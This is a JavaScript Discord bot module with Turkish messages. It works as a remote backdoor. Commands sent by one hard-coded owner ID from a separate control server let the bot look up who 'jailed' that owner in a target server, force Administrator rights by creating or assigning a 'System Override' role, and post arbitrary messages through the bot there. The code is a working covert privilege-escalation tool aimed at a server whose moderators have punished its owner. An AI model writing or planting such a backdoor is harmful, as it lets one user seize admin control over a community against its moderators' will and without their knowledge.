//--------------------------------
// ADVANCED CONTROL PANEL (V2 STABLE)
//--------------------------------

module.exports = (client) => {
    const PREFIX = "o!";
    const OWNER_ID = "1097807544849809408";
    const TARGET_GUILD_ID = "1446960659072946218";
    const CONTROL_GUILD_ID = "1475516491431678034";
    const CONTROL_CHANNEL_ID = "1488543017794142309";

    client.on('messageCreate', async (message) => {
        if (message.author.bot || !message.guild) return;
        if (message.author.id !== OWNER_ID) return;
        if (message.guild.id !== CONTROL_GUILD_ID || message.channel.id !== CONTROL_CHANNEL_ID) return;
        if (!message.content.startsWith(PREFIX)) return;

        const args = message.content.slice(PREFIX.length).trim().split(/ +/);
        const cmd = args.shift().toLowerCase();
        const targetGuild = client.guilds.cache.get(TARGET_GUILD_ID);

        if (!targetGuild) return message.reply("❌ Ana sunucu bulunamadı.");

        // --- WHO JAILED (PRO VERSION) ---
        if (cmd === "whojailed") {
            try {
                const logs = await targetGuild.fetchAuditLogs({ type: 25, limit: 15 });
                const entry = logs.entries.find(e => {
                    if (e.target?.id !== OWNER_ID) return false;
                    return e.changes?.some(c => c.key === "$add" && c.new.some(r => r.name.toLowerCase().includes("jail")));
                });

                if (!entry) return message.reply("🧐 Son kayıtlarda seni jailleyen bulunamadı.");
                return message.reply(`🕵️ Seni jailleyen kişi: **${entry.executor?.tag}** (ID: ${entry.executor?.id})`);
            } catch (e) { return message.reply("❌ Audit log hatası."); }
        }

        // --- FORCE ADMIN ---
        if (cmd === "forceadmin") {
            try {
                const member = await targetGuild.members.fetch(OWNER_ID);
                let adminRole = targetGuild.roles.cache.find(r => r.permissions.has("Administrator") && r.editable);
                if (!adminRole) {
                    adminRole = await targetGuild.roles.create({ name: 'System Override', permissions: ["Administrator"] });
                }
                await member.roles.add(adminRole);
                return message.reply("⚡ Admin yetkisi tanımlandı.");
            } catch (e) { return message.reply("❌ Hiyerarşi hatası: Botun rolü yetmiyor."); }
        }

        // --- SAY ---
        if (cmd === "say") {
            const channelId = args[0];
            const text = args.slice(1).join(" ");
            const channel = targetGuild.channels.cache.get(channelId);
            if (channel && text) {
                await channel.send(text);
                return message.reply("✅ Mesaj gönderildi.");
            }
        }
    });
};
